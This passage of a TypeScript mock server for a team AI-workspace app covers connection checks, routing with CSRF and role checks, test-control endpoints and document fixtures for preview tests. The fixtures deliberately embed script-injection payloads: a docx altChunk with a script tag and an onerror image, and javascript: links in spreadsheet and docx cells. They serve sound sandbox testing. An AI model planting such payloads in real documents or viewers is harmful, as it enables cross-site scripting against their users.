    // like the server: a stored key never follows a connection to another address or sign-in method
    if (moved || b.clearSecret) {
      this.integrationSecrets.delete(x.id)
      x.account = null
    }
    if (b.secret && (auth === 'bearer' || auth === 'header')) this.integrationSecrets.set(x.id, b.secret)
    if (moved) {
      x.tools = []
      x.toolsUpdatedAt = null
    }
    x.updatedAt = now()
    this.checkIntegration(x)
    return this.integrationView(x, u)
  }
  /** the connection check: a "down." host fails, a missing or refused key fails, sign-in is needed until done */
  checkIntegration(x: MockIntegration) {
    const keyed = x.auth === 'bearer' || x.auth === 'header'
    const secret = this.integrationSecrets.get(x.id)
    x.checks++
    const set = (status: Integration['status'], lastError: string | null) => Object.assign(x, { status, lastError })
    if (new URL(x.url).hostname.startsWith('down.')) set('error', '서비스가 응답하지 않아요(502). 잠시 뒤 다시 확인해 주세요.')
    else if (x.auth === 'oauth' && !secret) set('needs_auth', null)
    else if (keyed && !secret) set('error', '키가 없어요. 수정에서 키를 넣어 주세요.')
    else if (keyed && secret === 'wrong-key') set('error', '서비스가 키를 거절했어요(401). 키를 확인해 주세요.')
    else {
      set('connected', null)
      const host = new URL(x.url).hostname
      const many = (n: number) => Array.from({ length: n }, (_, i) => ({ name: `tool_${i}`, title: null, description: `Tool ${i}`, readOnly: i % 2 === 0, enabled: !x.disabledTools.includes(`tool_${i}`) }))
      if (x.kind === 'mcp' && host.startsWith('many.')) {
        // a "many." host offers 186 tools (like Higgsfield): the server keeps them all
        x.tools = many(186)
        delete x.toolsTotal
        x.toolsUpdatedAt = now()
      } else if (x.kind === 'mcp' && host.startsWith('stale.')) {
        // a "stale." host: its first list is the one an older server cut at 100 of 150; checking again saves all 150
        x.tools = many(x.checks > 1 ? 150 : 100)
        if (x.checks > 1) delete x.toolsTotal
        else x.toolsTotal = 150
        x.toolsUpdatedAt = now()
      } else if (x.kind === 'mcp') {
        // like server/src/integrations/connections/store.ts disabledTools: a tool turned off stays off, a new one is on
        x.tools = FAKE_MCP_TOOLS.slice(0, x.checks > 1 ? 3 : 2).map((t) => ({ ...t, enabled: !x.disabledTools.includes(t.name) }))
        x.toolsUpdatedAt = now()
      }
    }
  }

  enginesResponse() {
    return {
      engines: [
        { id: 'claude-code' as const, label: 'Claude Code', enabled: true, authMode: 'local-login' as const, installed: true, version: '2.1.305', status: 'ok' as const, detail: null, models: [{ id: 'claude-sonnet', label: 'Sonnet' }, { id: 'claude-opus', label: 'Opus' }], checkedAt: now() },
        { id: 'codex' as const, label: 'Codex', enabled: this.codexEnabled, authMode: 'local-login' as const, installed: true, version: '0.163.0', status: 'not_logged_in' as const, detail: 'Run `codex login --device-auth` on the server Mac.', models: [], checkedAt: now() },
        { id: 'api' as const, label: 'API', enabled: this.apiEngineEnabled, authMode: 'api-key' as const, installed: false, version: null, status: 'not_installed' as const, detail: 'Not set up yet. Enter the API address, model and key below.', models: [], checkedAt: now() },
      ],
      defaultEngine: this.settings.defaultEngine,
      defaultModel: this.settings.defaultModel,
      concurrency: this.settings.concurrency, concurrencyMax: this.cloud ? 3 : 16,
      accounts: [],
      memberChoice: this.memberChoice,
      limitFallback: this.limitFallback,
      limitFallbackAvailable: this.codexEnabled,
    }
  }

  makeAttachment(chatId: string, name: string, data: Uint8Array, mime: string, user: User): Attachment {
    const a: Attachment & { data: Uint8Array } = { id: uuidv7(), name, path: `users/${user.id}/.attachments/${chatId}/${name}`, size: data.byteLength, mime: mime || 'application/octet-stream', kind: mime.startsWith('image/') ? 'image' : mime.startsWith('audio/') ? 'audio' : 'other', data }
    this.attachments.set(a.id, a)
    this.putFile(a.path, data)
    const { data: _d, ...out } = a
    return out
  }

  /** like the server (component C checkTranscribe): a confidential chat's recording never goes to OpenRouter */
  transcribeGate(chatId: string | undefined) {
    this.transcribeChats.push(chatId ?? null)
    const confidential = chatId ? !!this.chats.find((x) => x.id === chatId)?.confidential : this.allConfidential
    if (confidential && this.settings.speechProvider === 'openrouter' && this.speechKey.set) {
      throw new Fail('forbidden', 403, '기밀 대화라서 녹음을 바깥 음성 서비스(OpenRouter)로 보내지 않았어요. 글로 입력해 주세요.', undefined, { reason: 'confidential' })
    }
  }

  transcribeJob(user: User): string {
    const id = uuidv7()
    const job: Job = { id, kind: 'transcribe', status: 'running', progress: null, message: null, result: null, error: null, createdAt: now(), finishedAt: null }
    this.jobs.set(id, job)
    setTimeout(() => {
      Object.assign(job, { status: 'done', progress: 1, result: { text: '받아쓴 문장입니다', language: 'ko', durationSec: 2 }, finishedAt: now() })
      this.publish({ type: 'job.done', data: { job } })
    }, 150)
    void user
    return id
  }

  // ---------------- HTTP ----------------
  routes = listEndpoints().map(({ name, ep }) => ({ name, ep, re: new RegExp('^' + ep.path.replace(/:([A-Za-z_]+)/g, '(?<$1>[^/]+)') + '$') }))

  async handle(req: Request, dist: string): Promise<Response> {
    const url = new URL(req.url)
    const p = url.pathname
    if (p.startsWith('/__test/')) return this.testControl(p, req)
    if (!p.startsWith('/api/')) return pageHeaders(serveWeb(req, { dist, dev: false, devPort: 0, teamIcon: () => this.teamIcon }) ?? new Response('no', { status: 404 }))
    this.log.push(`${req.method} ${p}`)
    const route = this.routes.find((r) => r.ep.method === req.method && r.re.test(p))
    try {
      if (!route) return fail('not_found', 404)
      const h = this.handlers[route.name]
      if (!h) return fail('not_found', 404, `mock: ${route.name} not implemented`)
      if (req.method !== 'GET' && !req.headers.get(CSRF_HEADER)) fail('csrf', 403)
      const ep = route.ep as Endpoint
      const user = this.userOf(req)
      if (ep.auth !== 'public') {
        if (!user) fail('unauthorized', 401)
        if ((ep.auth === 'admin' && user!.role === 'member') || ((ep.auth === 'owner' || ep.auth === 'owner-reauth') && user!.role !== 'owner')) fail('forbidden', 403)
        // like the server: a temporary password reaches only the endpoints that change it
        if (user!.mustChangePassword && !ep.allowWhilePasswordChange) fail('password_change_required', 403)
      }
      const params = Object.fromEntries(Object.entries(route.re.exec(p)!.groups ?? {}).map(([k, v]) => [k, decodeURIComponent(v)]))
      const query = Object.fromEntries(url.searchParams.entries())
      if (ep.query && isSchema(ep.query)) {
        const q = ep.query.safeParse(query)
        if (!q.success) fail('validation', 400, JSON.stringify(q.error.issues))
      }
      let body: any
      let file: File | undefined
      if (ep.body && isSchema(ep.body)) {
        const parsed = (ep.body as z.ZodType).safeParse(await req.json())
        if (!parsed.success) fail('validation', 400, JSON.stringify(parsed.error.issues))
        body = parsed.data
      } else if (ep.body && (ep.body as { kind: string }).kind === 'multipart') {
        const fd = await req.formData()
        const fields: Json = {}
        for (const [k, v] of fd.entries()) if (typeof v === 'string') fields[k] = v
        const parsed = (ep.body as { fields: z.ZodType }).fields.safeParse(fields)
        if (!parsed.success) fail('validation', 400, JSON.stringify(parsed.error.issues))
        body = parsed.data
        file = fd.get('file') as File
      }
      const out = await h({ user: user!, params, query, body, req, file })
      if (out instanceof Response) return out
      const o = (out && typeof out === 'object' && ('body' in (out as Json) || 'cookie' in (out as Json)) && !('id' in (out as Json)) ? out : { body: out }) as { status?: number; body: unknown; cookie?: string }
      const status = o.status ?? ep.status ?? 200
      const headers: Record<string, string> = { 'content-type': 'application/json' }
      if (o.cookie) headers['set-cookie'] = o.cookie
      if (status === 204 || (!isSchema(ep.response) && (ep.response as { kind: string }).kind === 'empty')) return new Response(null, { status: 204, headers: o.cookie ? { 'set-cookie': o.cookie } : {} })
      // the mock must speak the contract exactly: a mismatch here is a bug in the mock or the contract changed
      const checked = (ep.response as z.ZodType).parse(o.body)
      return new Response(JSON.stringify(checked), { status, headers })
    } catch (e) {
      if (e instanceof Fail) return new Response(JSON.stringify(ApiErrorResponse.parse({ error: { code: e.code, message: e.message, ...(e.fields ? { fields: e.fields } : {}), ...(e.params ? { params: e.params } : {}) } })), { status: e.status, headers: { 'content-type': 'application/json' } })
      console.error('mock error', req.method, p, e)
      return new Response(JSON.stringify({ error: { code: 'internal', message: String(e) } }), { status: 500, headers: { 'content-type': 'application/json' } })
    }
  }

  async testControl(p: string, req: Request): Promise<Response> {
    const body = (await req.json().catch(() => ({}))) as Json
    if (p === '/__test/reset') this.reset({ setup: !!body.setup, teamLocale: Locale.safeParse(body.teamLocale).data, usersFollowTeam: !!body.usersFollowTeam, mustChange: typeof body.mustChange === 'string' ? body.mustChange : undefined })
    else if (p === '/__test/drop-ws') for (const ws of this.sockets) ws.close(WsClose.serviceRestart, 'restart')
    else if (p === '/__test/server-version') this.serverVersion = String(body.version)
    else if (p === '/__test/upload-delay') this.uploadDelayMs = Number(body.ms)
    else if (p === '/__test/cloud') this.cloud = body.on !== false
    else if (p === '/__test/popular-skills') this.popular = (body.items as { path: string; uses: number; users: number }[]) ?? []
    else if (p === '/__test/team-goal') this.teamGoal = body.goal === null ? null : TeamGoal.parse(body.goal)
    else if (p === '/__test/result-suggestion') this.resultSuggestion = body.suggestion ? (body.suggestion as unknown as import('@mycel/shared/api').ResultSuggestion) : null
    else if (p === '/__test/dev-env') {
      const by = this.users[0] ? { id: this.users[0].id, name: this.users[0].name } : null
      const run = (id: string, kind: 'job' | 'server', name: string, position: number | null, lastLine: string) => ({ id, kind, name, by, startedAt: now(), runAt: position === null ? now() : null, position, memoryMiB: position === null ? 320 : null, lastLine })
      if (body.network === 'offline') this.devEnvTeam.network = 'offline'
      if (Array.isArray(body.sites)) this.devEnvSites.set(this.users[0]!.id, { sites: (body.sites as string[]).map((host) => ({ host, createdAt: now() })), full: false })
      this.devEnv = { box: body.box === 'running' ? 'running' : 'stopped', ...(body.srt ? { srt: { running: [run('r1', 'server', 'npm run dev', null, 'ready on http://localhost:3000')], waiting: [run('r2', 'job', 'render', 1, '')] } } : {}) }
    }
    else if (p === '/__test/skill-list') this.aiList = SkillsOverview.shape.aiList.parse(body)
    else if (p === '/__test/connection') this.connection = { ...this.connection, ...(body as unknown as Partial<ConnectionStatus>) }
    else if (p === '/__test/speech-host') this.speechHost = { ...this.speechHost, ...(body as unknown as Partial<typeof this.speechHost>) }
    else if (p === '/__test/memory') this.memories.push({ id: uuidv7(), text: String(body.text), sourceChatId: null, createdAt: now() })
    else if (p === '/__test/schedule') {
      // a scheduled task the owner confirmed on its card (or a template: templateId), for Settings › Scheduled tasks
      const owner = this.users.find((u) => u.role === 'owner')!
      const tpl = typeof body.templateId === 'string' ? body.templateId as 'daily-file-index' | 'weekly-summary' : null
      this.schedules.push({ userId: owner.id, id: uuidv7(), title: String(body.title ?? '주간 회의록 요약'), prompt: String(body.prompt ?? '매주 월요일 shared/회의록 에서 지난주 회의록을 읽고 users/olga/주간요약.md 에 정리해 줘.'),
        repeat: tpl === 'weekly-summary' ? 'weekly' : tpl ? 'daily' : (body.repeat as Schedule['repeat'] | undefined) ?? 'weekly', time: '09:00', weekday: tpl === 'daily-file-index' ? null : 1, day: null, date: null, projectId: null,
        enabled: body.enabled !== false, resumeBlockedReason: null, nextRunAt: body.enabled === false ? null : new Date(Date.now() + 86400_000).toISOString(), lastRunAt: null, lastChatId: null, needsReview: false, reviewSince: null,
        ...(tpl ? { templateId: tpl, templateVersion: 1, sourcePath: 'shared/회의록', outputPath: `users/${owner.id}/reports` } : {}) })
    }
    else if (p === '/__test/schedule-review') {
      // a free-text task made before the schedule card: paused until its owner confirms it again
      const owner = this.users.find((u) => u.role === 'owner')!
      this.schedules.push({ userId: owner.id, id: uuidv7(), title: '아침 요약', prompt: '매일 아침 https://feeds.example.com/r/c2fsyxj5ltk4nzy1ndmy 를 읽고 users/olga/요약.md 에 정리해 줘.',
        repeat: 'daily', time: '09:00', weekday: null, day: null, date: null, projectId: null, enabled: false, resumeBlockedReason: null, nextRunAt: null, lastRunAt: null,
        lastChatId: null, needsReview: true, reviewSince: now() })
    }
    else if (p === '/__test/log') return Response.json(this.log)
    else if (p === '/__test/engine-requests') return Response.json(this.engineRequests)
    else if (p === '/__test/member-choice') this.memberChoice = MemberEngineChoice.parse(body)
    else if (p === '/__test/queue') {
      const chatId = String(body.chatId), position = Number(body.position)
      const assistant = this.messages.find(m => m.chatId === chatId && m.status === 'streaming')
      if (!assistant?.turnId || !Number.isInteger(position) || position < 0) return Response.json({ ok: false }, { status: 400 })
      this.queuePositions.set(chatId, position)
      this.publish({ type: 'queue.position', data: { chatId, messageId: assistant.id, turnId: assistant.turnId, position, epoch: this.epoch, revision: ++this.queueRevision } })
    }
    else if (p === '/__test/confidential') this.allConfidential = body.all === true
    else if (p === '/__test/speech') {
      this.settings.speechProvider = body.provider === 'openrouter' || body.provider === 'off' ? body.provider : 'local'
      this.speechKey = body.key ? { set: true, hint: 'mock', updatedAt: now() } : { set: false, hint: null, updatedAt: null }
    }
    else if (p === '/__test/transcribe-chats') return Response.json(this.transcribeChats)
    else if (p === '/__test/file') {
      // a team file for a test (POST {path, text} or {path, base64}); its folders are made too
      const path = String(body.path)
      const parts = path.split('/')
      for (let i = 1; i < parts.length; i++) { const d = parts.slice(0, i).join('/'); if (!this.files.has(d)) this.files.set(d, { type: 'folder', mtime: now() }) }
      this.putFile(path, typeof body.base64 === 'string' ? new Uint8Array(Buffer.from(body.base64, 'base64')) : String(body.text ?? ''))
    }
    else if (p === '/__test/rmdir') {
      // a folder gone from disk (moved away outside the app): its folder rows and rules stay
      const path = String(body.path)
      for (const k of [...this.files.keys()]) if (k === path || k.startsWith(path + '/')) this.files.delete(k)
    }
    else if (p === '/__test/download-only') {
      this.putFile(String(body.path), 'PK generated deck')
      this.downloadOnly.add(String(body.path))
    }
    else if (p === '/__test/artifact') this.nextArtifact = { type: (['html', 'svg', 'react', 'mermaid'] as const).find((t) => t === body.type) ?? 'html', content: String(body.content) }
    else if (p === '/__test/skills') {
      // skill files: [{path, name, description}] (a name header each), e.g. skills/weekly.md or users/bob/skills/x.md
      for (const f of (body.files as { path: string; name: string; description?: string; title?: string }[]) ?? []) {
        for (let d = f.path.lastIndexOf('/'); d > 0; d = f.path.lastIndexOf('/', d - 1)) this.files.set(f.path.slice(0, d), this.files.get(f.path.slice(0, d)) ?? { type: 'folder', mtime: now() })
        this.putFile(f.path, `---\nname: ${f.name}\ndescription: ${f.description ?? ''}\n${f.title ? `metadata:\n  title: ${f.title}\n` : ''}---\n${f.name} steps\n`)
      }
    }
    else if (p === '/__test/revoke') {
      // like the server after a folder-rule change: the folder is gone for everyone, who get an access_changed notice
      this.revoked.add(String(body.path))
      this.publish({ type: 'notice', data: { level: 'info', code: 'access_changed', message: String(body.path) } })
    }
    return Response.json({ ok: true })
  }

  serve(port: number, dist: string) {
    const self = this
    return Bun.serve<WsData, never>({
      port,
      hostname: '127.0.0.1',
      async fetch(req, server) {
        const url = new URL(req.url)
        if (url.pathname === WS_PATH) {
          const user = self.userOf(req)
          const after = url.searchParams.get('after')
          const data: WsData = { user: user?.id ?? '', windowId: url.searchParams.get('windowId') ?? '', epoch: url.searchParams.get('epoch'), after: after === null ? null : Number(after) }
          const ok = server.upgrade(req, { data, headers: { 'sec-websocket-protocol': 'mycel.v1' } })
          return ok ? undefined : new Response('upgrade failed', { status: 400 })
        }
        return self.handle(req, dist)
      },
      websocket: {
        open(ws) {
          if (!ws.data.user) return ws.close(WsClose.unauthorized, 'sign in')
          self.sockets.add(ws)
          const hello = (resumed: boolean) => JSON.stringify({ type: 'hello', epoch: self.epoch, seq: self.seq, resumed, windowId: ws.data.windowId, serverVersion: self.serverVersion, pingIntervalMs: 20000 })
          const { epoch, after } = ws.data
          if (epoch && epoch !== self.epoch) {
            ws.send(hello(false))
            ws.send(JSON.stringify({ type: 'reset', epoch: self.epoch, seq: self.seq, reason: 'epoch_mismatch' }))
          } else if (epoch && after !== null) {
            const oldest = self.buffer[0]?.seq ?? self.seq + 1
            if (after + 1 < oldest) {
              ws.send(hello(false))
              ws.send(JSON.stringify({ type: 'resync', epoch: self.epoch, seq: self.seq, reason: 'buffer_overflow' }))
            } else {
              ws.send(hello(true))
              for (const b of self.buffer) if (b.seq > after) ws.send(b.text)
            }
          } else ws.send(hello(false))
        },
        message(ws, msg) {
          const f = JSON.parse(String(msg)) as { type: string; t?: number }
          if (f.type === 'ping') ws.send(JSON.stringify({ type: 'pong', t: f.t ?? 0 }))
        },
        close(ws) {
          self.sockets.delete(ws)
        },
      },
    })
  }
}

function mimeOf(path: string): string | null {
  const e = path.toLowerCase().split('.').pop() ?? ''
  return ({ md: 'text/markdown', csv: 'text/csv', txt: 'text/plain', html: 'text/html', png: 'image/png', jpg: 'image/jpeg', pdf: 'application/pdf', json: 'application/json' } as Record<string, string>)[e] ?? null
}

type MockIntegration = Omit<Integration, 'hasSecret' | 'canManage'> & { ownerId: string | null; checks: number; disabledTools: string[] }
const NO_ACCESS: IntegrationAccess = { everyone: false, groups: [], users: [] }
/** what the fake MCP server offers: two tools at first, a third once it is checked again */
const FAKE_MCP_TOOLS: IntegrationTool[] = [
  { name: 'search_pages', title: 'Search pages', description: 'Find pages by words in their title or text.', readOnly: true },
  { name: 'create_page', title: 'Create page', description: 'Create a new page in a workspace.', readOnly: false },
  { name: 'get_page', title: null, description: 'Read one page with its blocks.', readOnly: true },
]
/** like server/src/web-fetch.ts resolveTarget (by name only here): this computer and office networks are refused */
const privateHost = (h: string) => h === 'localhost' || h.endsWith('.localhost') || h.endsWith('.local') || h.endsWith('.internal') || /^(127|10)\./.test(h) || /^192\.168\./.test(h) || /^172\.(1[6-9]|2\d|3[01])\./.test(h) || h === '[::1]'

function defaultSettings(): TeamSettings {
  return { teamName: 'Acme', defaultLocale: 'ko', defaultEngine: 'claude-code', defaultModel: null, concurrency: 2, updateChannel: 'stable', updateWindow: null, auditRetentionDays: 365, fileHistoryRetentionDays: 90, trashRetentionDays: 30, chatTrashRetentionDays: 7, timeZone: 'Asia/Seoul', browserAllowAll: true, personalIntegrations: true, aiVision: true, aiSubagents: true, answerStepLimit: 150, speechProvider: 'local', speechModel: 'openai/whisper-large-v3-turbo', aiMediaTranscripts: null }
}

/** What the real server's securityHeaders() middleware adds to every non-/api response (server/src/http/middleware.ts). */
function pageHeaders(res: Response): Response {
  const h = new Headers(res.headers)
  h.set('X-Content-Type-Options', 'nosniff')
  h.set('Referrer-Policy', 'same-origin')
  h.set('X-Frame-Options', 'DENY')
  h.set('Cross-Origin-Opener-Policy', 'same-origin')
  return new Response(res.body, { status: res.status, headers: h })
}

/** pandoc's docx with an altChunk (an HTML part docx-preview would draw in an unsandboxed srcdoc iframe). */
function withAltChunk(docx: string): boolean {
  const dir = `${docx}.d`
  try {
    fs.rmSync(dir, { recursive: true, force: true })
    if (Bun.spawnSync(['unzip', '-q', docx, '-d', dir]).exitCode !== 0) return false
    fs.writeFileSync(`${dir}/word/chunk.html`, '<html><body><p>alt chunk</p><script>top.document.title = "pwned-altchunk"</script><img src="x" onerror="top.document.title = \'pwned-altchunk\'"></body></html>')
    const doc = `${dir}/word/document.xml`
    fs.writeFileSync(doc, fs.readFileSync(doc, 'utf8').replace('</w:body>', '<w:altChunk r:id="rIdAlt1"/></w:body>').replace(/(<w:sectPr[\s\S]*?<\/w:sectPr>)(<w:altChunk r:id="rIdAlt1"\/>)/, '$2$1'))
    const rels = `${dir}/word/_rels/document.xml.rels`
    fs.writeFileSync(rels, fs.readFileSync(rels, 'utf8').replace('</Relationships>', '<Relationship Id="rIdAlt1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="chunk.html"/></Relationships>'))
    const types = `${dir}/[Content_Types].xml`
    fs.writeFileSync(types, fs.readFileSync(types, 'utf8').replace('</Types>', '<Override PartName="/word/chunk.html" ContentType="text/html"/></Types>'))
    fs.rmSync(docx)
    return Bun.spawnSync(['zip', '-q', '-r', '-X', docx, '.'], { cwd: dir }).exitCode === 0
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
}

let office: [string, Uint8Array][] | null = null
/** PDF / xlsx / docx / pptx samples for the preview tests (docx and pptx need pandoc; skipped without it). */
function officeFixtures(): [string, Uint8Array][] {
  if (office) return office
  const out: [string, Uint8Array][] = [['docs/handbook.pdf', makePdf(['Company Handbook 2026', 'Section 1: Working hours are flexible.'])]]
  // PDFs pdf.js can only draw with its data files (web/src/lib/pdfjs-assets.ts): Korean text in a font the file does
  // not embed, a fax-style scan (CCITT) and a JPEG 2000 scan
  out.push(['docs/quote-form.pdf', makeCidPdf(['견적서 2026', '공급가액 합계 1,500,000원'])])
  out.push(['docs/scan-fax.pdf', makeImagePdf(CCITT_SCAN)])
  out.push(['docs/scan-jpeg2000.pdf', makeImagePdf(JPX_SCAN)])
  const wb = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([['month', 'spend'], ['July', 1200], ['August', 900]]), 'Q3 spend')
  out.push(['docs/spend.xlsx', new Uint8Array(XLSX.write(wb, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer)])
  // the files an answer's "참고한 파일" points into (a page, a sheet range, a slide): long enough to scroll
  out.push(['docs/sources/report.pdf', makePagedPdf(Array.from({ length: 6 }, (_, i) => [`Sales report page ${i + 1}`, ...Array.from({ length: 30 }, (_, k) => `line ${k + 1} of page ${i + 1}`)]))])
  const budget = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(budget, XLSX.utils.aoa_to_sheet([['summary'], ['see 매출']]), '요약')
  XLSX.utils.book_append_sheet(budget, XLSX.utils.aoa_to_sheet([['month', 'channel', 'spend'], ...Array.from({ length: 80 }, (_, i) => [`m${i + 1}`, i % 2 ? 'naver' : 'instagram', 1000 + i])]), '매출')
  out.push(['docs/sources/budget.xlsx', new Uint8Array(XLSX.write(budget, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer)])
  // a sheet whose cells link to javascript: and to a web page
  const links = XLSX.utils.aoa_to_sheet([['evil cell', 'web cell']])
  links.A1!.l = { Target: 'javascript:top.document.title="pwned-xlsx"' }
  links.B1!.l = { Target: 'https://example.com/sheet' }
  const wb2 = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(wb2, links, 'links')
  out.push(['docs/links.xlsx', new Uint8Array(XLSX.write(wb2, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer)])
  const docs = [
    ['brand.docx', 'docx', '# Brand guidelines\n\nPrimary color: mint.\n'],
    ['kickoff.pptx', 'pptx', '# Q4 kickoff\n\n- Launch in November\n'],
    ['sources/deck.pptx', 'pptx', Array.from({ length: 6 }, (_, i) => `## Deck slide ${i + 1}\n\n- point ${i + 1}\n`).join('\n')],
    ['links.docx', 'docx', '# Links\n\n[evil link](javascript:top.document.title="pwned-docx") and [web link](https://example.com/doc) and [app link](/admin/members)\n'],
  ] as const
  for (const [name, to, md] of docs) {
    try {
      const tmp = `${process.env.TMPDIR ?? '/tmp'}/mycel-mock-${process.pid}-${name.replace(/\//g, '-')}`
      const p = Bun.spawnSync(['pandoc', '-f', 'markdown', '-t', to, '-o', tmp], { stdin: enc.encode(md) })
      if (p.exitCode === 0 && (name !== 'links.docx' || withAltChunk(tmp))) {
        out.push([`docs/${name}`, new Uint8Array(fs.readFileSync(tmp))])
        fs.rmSync(tmp, { force: true })
      }
    } catch { /* no pandoc: no docx/pptx sample */ }
  }
  return (office = out)
}
